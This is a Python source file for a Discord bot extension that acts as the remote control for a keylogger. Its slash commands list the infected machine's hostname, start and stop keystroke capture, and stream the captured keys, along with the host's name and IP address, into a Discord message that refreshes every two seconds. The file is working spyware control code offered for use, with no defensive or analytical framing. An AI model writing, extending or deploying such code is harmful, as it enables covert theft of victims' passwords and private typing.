import discord
from discord.ext import commands
from discord import app_commands
from utils import logger
import asyncio

class KeyLogger(commands.GroupCog):
    group_name = "keylog"
    group_description = "Keylogger commands"
    dm_permission = True

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @app_commands.command(name="listed", description="List all the devices")
    async def keylog_list(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"{logger.hostname}", ephemeral=True)

    @app_commands.command(name="start", description="Start the keylogger")
    async def keylog_start(self, interaction: discord.Interaction):
        if not logger.get_keylog_state():
            logger.set_keylog_state(True)
            await interaction.response.send_message("Keylogger started.", ephemeral=True)
        else:
            await interaction.response.send_message("Keylogger already running.", ephemeral=True)

    @app_commands.command(name="stop", description="Stop the keylogger")
    async def keylog_stop(self, interaction: discord.Interaction):
        if logger.get_keylog_state():
            logger.set_keylog_state(False)
            await interaction.response.send_message("Keylogger stopped.", ephemeral=True)
        else:
            await interaction.response.send_message("Keylogger is not running.", ephemeral=True)

    @app_commands.command(name="show", description="Show the keylogger")
    async def keylog_show(self, interaction: discord.Interaction, target: str):
        if target != logger.hostname:
            await interaction.response.send_message("Target Unavailable")
            return

        embed = discord.Embed(
            colour=discord.Colour.green(),
            title=f"---- {logger.hostname} : {logger.ip} -----",
            description=logger.get_log()
        )

        await interaction.response.send_message(embed=embed)
        msg = await interaction.original_response()
        while logger.get_keylog_state():
            await asyncio.sleep(2)
            new_embed = discord.Embed(
                colour=discord.Colour.green(),
                title=f"---- {logger.hostname} : {logger.ip} -----",
                description=logger.get_log()
            )
            await msg.edit(embed=new_embed)

async def setup(bot: commands.Bot):
    await bot.add_cog(KeyLogger(bot))
